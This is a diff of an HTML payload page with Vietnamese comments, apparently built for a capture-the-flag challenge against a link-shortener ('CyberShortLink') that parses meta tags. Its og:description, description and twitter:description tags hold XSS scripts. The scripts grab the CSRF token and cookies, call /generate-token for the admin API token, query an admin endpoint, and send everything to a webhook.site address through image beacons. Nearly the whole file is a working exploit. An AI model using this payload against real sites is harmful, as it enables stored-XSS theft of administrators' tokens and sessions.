@@ -2,27 +2,146 @@
 <html>
 <head>
     <meta charset="utf-8">
-    <title>Trang Tải XSS Payload</title>
-    <!-- Quan trọng: og:title và og:description chứa XSS payload -->
-    <meta property="og:title" content="Admin! Tin Khẩn!">
-    <meta property="og:description" content="<script>// Kịch bản 1: Lấy API Token của Admin
-          fetch('/generate-token', {
-            method: 'POST',
-            headers: {
-              'X-CSRF-TOKEN': document.querySelector('meta[name="csrf-token"]').content // Nếu trang có CSRF token
-            }
-          })
-          .then(response => response.json())
-          .then(data => {
-            // Gửi API token của admin về server của bạn
-            new Image().src = 'https://webhook.site/792a817c-a6b3-4529-a9ed-5780c728488a?admin_api_token=' + encodeURIComponent(data.token);
-          })
-          .catch(error => {
-            new Image().src = 'https://webhook.site/792a817c-a6b3-4529-a9ed-5780c728488a?error_generating_token=' + encodeURIComponent(error.message);
-  });</script>">
+    <title>Trang Tải XSS Payload - Admin Action</title>
+
+    <!-- 
+        Chúng ta sẽ đặt payload chính vào og:description vì nó thường dài hơn.
+        Title có thể để một cái gì đó chung chung.
+    -->
+    <meta property="og:title" content="Thông báo Quan trọng cho Quản trị viên">
+    
+    <meta property="og:description" content="
+        <script>
+            (function() {
+                var webhook_id = '792a817c-a6b3-4529-a9ed-5780c728488a';
+                var webhook_base_url = 'https://webhook.site/';
+                var attacker_url = webhook_base_url + webhook_id;
+
+                function sendData(type, data) {
+                    var payload = {};
+                    payload[type] = data;
+                    new Image().src = attacker_url + '?' + new URLSearchParams(payload).toString();
+                }
+
+                // Cố gắng lấy CSRF token từ meta tag
+                var csrfToken = null;
+                try {
+                    var metaCsrf = document.querySelector('meta[name=\"csrf-token\"]');
+                    if (metaCsrf) {
+                        csrfToken = metaCsrf.content;
+                        sendData('csrf_token_found', csrfToken);
+                    } else {
+                        sendData('csrf_token_status', 'not_found_in_meta');
+                    }
+                } catch (e) {
+                    sendData('csrf_token_error', e.message);
+                }
+
+                // Gửi cookie hiện tại (dù có thể không có session cookie do HttpOnly) để kiểm tra
+                sendData('current_document_cookie', document.cookie || 'empty');
+
+                // Kịch bản 1: Cố gắng gọi /generate-token để lấy API token của admin
+                // Endpoint này thường yêu cầu CSRF token khi gọi từ web context
+                if (csrfToken) {
+                    fetch('/generate-token', {
+                        method: 'POST',
+                        headers: {
+                            'X-CSRF-TOKEN': csrfToken,
+                            'Accept': 'application/json', // Quan trọng để server trả về JSON
+                            'X-Requested-With': 'XMLHttpRequest' // Một số server kiểm tra header này
+                        }
+                        // Không cần body cho /generate-token theo code
+                    })
+                    .then(response => {
+                        if (!response.ok) {
+                            // Nếu lỗi, thử lấy text để debug
+                            return response.text().then(text => {
+                                throw new Error('Token generation failed: ' + response.status + ' - ' + text);
+                            });
+                        }
+                        return response.json();
+                    })
+                    .then(data => {
+                        if (data.token) {
+                            sendData('admin_api_token', data.token);
+                            // Nếu có token, bạn có thể thử gọi /api/admin/sup3rs3cr3t ngay tại đây
+                            // fetch('/api/admin/sup3rs3cr3t', { headers: { 'Authorization': 'Bearer ' + data.token, 'Accept': 'application/json'}})
+                            // .then(r => r.json()).then(flagData => sendData('flag2_via_api_token', JSON.stringify(flagData)));
+                        } else {
+                            sendData('generate_token_response_no_token', JSON.stringify(data));
+                        }
+                    })
+                    .catch(error => {
+                        sendData('generate_token_error', error.message);
+                    });
+                } else {
+                    sendData('generate_token_status', 'skipped_due_to_missing_csrf');
+                }
+
+                // Kịch bản 2: Thử gọi trực tiếp /api/admin/sup3rs3cr3t
+                // Endpoint API này thường dùng Bearer token, nhưng nếu XSS thực thi trong context
+                // của admin đã đăng nhập (có session cookie HttpOnly), một số cấu hình Sanctum có thể
+                // cho phép truy cập dựa trên session đó mà không cần Bearer token tường minh.
+                // Tuy nhiên, middleware 'admin' vẫn được áp dụng.
+                fetch('/api/admin/sup3rs3cr3t', {
+                    method: 'GET',
+                    headers: {
+                        'Accept': 'application/json',
+                        'X-Requested-With': 'XMLHttpRequest'
+                    }
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        return response.text().then(text => {
+                             throw new Error('sup3rs3cr3t direct fetch failed: ' + response.status + ' - ' + text);
+                        });
+                    }
+                    return response.json();
+                })
+                .then(data => {
+                    sendData('sup3rs3cr3t_direct_response', JSON.stringify(data));
+                })
+                .catch(error => {
+                    sendData('sup3rs3cr3t_direct_error', error.message);
+                });
+
+            })();
+        </script>
+    ">
+
+    <!-- Các thẻ meta khác để tăng khả năng được parse -->
+    <meta name="description" content="
+        <script>
+            (function() {
+                var webhook_id = '792a817c-a6b3-4529-a9ed-5780c728488a';
+                var webhook_base_url = 'https://webhook.site/';
+                var attacker_url = webhook_base_url + webhook_id;
+                // ... (Copy toàn bộ script từ og:description vào đây nếu muốn, hoặc một payload khác)
+                // Để đơn giản, có thể chỉ cần một cái alert ở đây để test xem thẻ này có được ưu tiên không
+                // alert('XSS from name=description');
+                // Hoặc lặp lại logic gửi cookie/token
+                new Image().src = attacker_url + '?trigger_from=name_description&cookie=' + encodeURIComponent(document.cookie);
+            })();
+        </script>
+    ">
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="Thông báo Khẩn cấp">
+    <meta name="twitter:description" content="
+        <script>
+            (function() {
+                var webhook_id = '792a817c-a6b3-4529-a9ed-5780c728488a';
+                var webhook_base_url = 'https://webhook.site/';
+                var attacker_url = webhook_base_url + webhook_id;
+                // ... (Copy toàn bộ script từ og:description vào đây nếu muốn)
+                // alert('XSS from twitter:description');
+                new Image().src = attacker_url + '?trigger_from=twitter_description&cookie=' + encodeURIComponent(document.cookie);
+            })();
+        </script>
+    ">
+
 </head>
 <body>
-    <h1>Nội dung trang này không quan trọng lắm</h1>
-    <p>Internal Server sẽ đọc các thẻ meta ở trên.</p>
+    <h1>Trang Web Chứa Payload XSS</h1>
+    <p>Nếu bạn thấy trang này, nghĩa là Internal Server đã fetch nó. Script trong các thẻ meta sẽ được CyberShortLink lưu lại và thực thi khi admin xem trang safe-redirect.</p>
 </body>
 </html>
